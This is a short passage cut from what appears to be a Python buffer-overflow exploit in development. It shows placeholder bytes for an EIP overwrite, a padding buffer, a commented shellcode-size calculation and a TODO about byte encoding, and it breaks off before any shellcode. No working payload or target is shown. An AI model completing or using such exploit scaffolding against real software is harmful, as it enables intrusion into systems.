...
try:
    ...
    eip = "B" * 4
    buffer = "C" * 4
    # shellcode = (1500 - len(filler) - len(eip) - len(buffer)) * "D" + "\x01\x02"


    # TODO: This is definitely an encoding issue. Send() expects a byte object but encode transforms
    # to UTF8. Using "ascii" will not work as the chars > 0x80 are not representable...
    shellcode = (
